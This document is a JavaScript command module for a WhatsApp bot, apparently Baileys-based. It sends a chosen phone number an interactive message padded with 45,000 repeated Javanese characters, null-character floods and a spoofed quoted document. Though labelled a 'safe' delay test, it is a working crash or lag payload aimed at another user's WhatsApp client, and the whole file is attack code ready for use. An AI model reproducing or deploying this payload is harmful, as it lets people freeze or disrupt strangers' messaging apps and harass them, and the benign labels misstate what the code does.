export default {
  name: "delaytest",
  description: "📡 Send a large interactive message to a specific JID (safe version)",
  async execute(sock, msg, args) {
    if (!args[0]) {
      await sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Please provide a target number.\nExample: .delaytest 234805421932" });
      return;
    }

    // 🧠 Format number to proper JID
    let targetNumber = args[0].replace(/[^0-9]/g, ""); // remove @ or non-digits
    const targetJid = `${targetNumber}@s.whatsapp.net`;

    try {
      const message = {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "Malaysia Delay Test 🇲🇾",
                hasMediaAttachment: false,
                locationMessage: {
                  degreesLatitude: 3.139,
                  degreesLongitude: 101.6869,
                  name: "Delay Testing " + "ꦾ".repeat(45000),
                  address: "📍 Kuala Lumpur",
                },
              },
              body: {
                text: "X-delay " + "ꦾ".repeat(45000),
              },
              nativeFlowMessage: {
                messageParamsJson: "\u0000".repeat(10000),
              },
              contextInfo: {
                participant: targetJid,
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 5 }, (_, i) => `1${i}@s.whatsapp.net`),
                ],
                quotedMessage: {
                  documentMessage: {
                    fileName: "coreXdelay.js",
                    mimetype: "text/plain",
                    fileLength: 1000,
                    caption: "coreXdelay",
                    pageCount: 1,
                    mediaKey: "\u0000".repeat(10000),
                    jpegThumbnail: Buffer.from(""),
                  },
                },
              },
            },
          },
        },
      };

      await sock.relayMessage(targetJid, message, { messageId: msg.key.id });

      await sock.sendMessage(msg.key.remoteJid, { text: `✅ Delay test message sent to *${targetNumber}*` });
    } catch (e) {
      console.error(e);
      await sock.sendMessage(msg.key.remoteJid, { text: "❌ Failed to send delay test message." });
    }
  },
};
